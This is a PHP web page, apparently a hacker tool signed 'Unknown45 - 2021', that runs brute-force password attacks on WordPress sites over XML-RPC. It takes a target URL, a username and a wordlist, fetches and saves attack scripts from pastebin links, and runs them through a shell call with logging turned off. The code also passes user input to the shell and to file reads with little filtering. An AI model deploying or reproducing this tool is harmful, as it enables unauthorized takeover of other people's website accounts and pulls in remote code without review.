<html>
<head>
<title>[+] WordPress Brute Force [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$memek = $_REQUEST['file'];
$kentod = file_get_contents("/tmp/tempku/".$memek."_wpbf.uk45");
if ($memek) {
  header("Content-Type: text/html");
  echo "<pre style='text-align: left; white-space: pre-line;'>";
  echo '<div onclick="window.stop();" style="cursor: pointer;">[ Stop Loading ]</div><hr>';
  echo $kentod;
  echo "</pre>";
  echo '<meta http-equiv="Refresh" content="3">';
  exit();
}
?>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
.vuln {
  color: green;
}
</style>
<form method="post" enctype="multipart/form-data">
<font face=courier size=5>Wordpress Brute Force<br>
  <font size="3">Bruteforce wordpress dengan xmlrpc bruteforce</font></font><hr>
<font face=courier>Url<br/>
<input type="text" size="40" name="url" class="courier" placeholder="https://exploits.my.id/"><br/><br>
Username<br/>
<input type="text" size="40" name="user" class="courier" placeholder="admin"><br/><br>
<b>Wordlists</b><br/>
<input type="file" name="wordlist"><br/><br>
<input type="submit" name="startbf" value="Gaskan">
</form><br>
<?php
$random = mt_rand(10000000,99999999);
$webnya = basename($_SERVER['REQUEST_URI']);
$urlnya = str_replace("'", "", $_POST['url']);
$usernya = str_replace("'", "", $_POST['user']);
$wordlistnya = $_FILES['wordlist']['tmp_name'];
if (!file_exists("/tmp/tempku/class-IXR.php")) {
  $ixr = file_get_contents("https://pastebin.com/raw/TdFRzJaS");
  file_put_contents("/tmp/tempku/class-IXR.php", $ixr);
} if (!file_exists("/tmp/tempku/wepebeef.php")) {
  $wpbf = file_get_contents("https://pastebin.com/raw/BF8eyPby");
  file_put_contents("/tmp/tempku/wepebeef.php", $wpbf);
} if (!file_exists("/tmp/tempku")) {
  mkdir("/tmp/tempku");
}
if (!empty($wordlistnya)) {
  $kentod = file_get_contents($wordlistnya);
  file_put_contents("/tmp/tempku/wordlist.uk45", $kentod);
  $wordlists = "/tmp/tempku/wordlist.uk45";
  echo "<hr>Check <a href='".$webnya."&file=".$random."' target='_blank'><font color=yellow>Live Output Text</font></a> Here<br>";
  echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
  ob_implicit_flush(true);ob_end_flush();
  system("php /tmp/tempku/wepebeef.php '".$urlnya."' '".$usernya."' ".$wordlists." | tee -a /tmp/tempku/".$random."_wpbf.uk45");
}
echo "</pre>";
//ob_implicit_flush(true);ob_end_flush();
//passthru("php /home/forsaken/Documents/bot/WPbf.php/WordPress-XMLRPC-BruteForce-PoC/wpbruteforce.php ".$urlnya." ".$usernya." ".$wordlists."");
?>
<hr><font size="3">Unknown45 - 2021</font>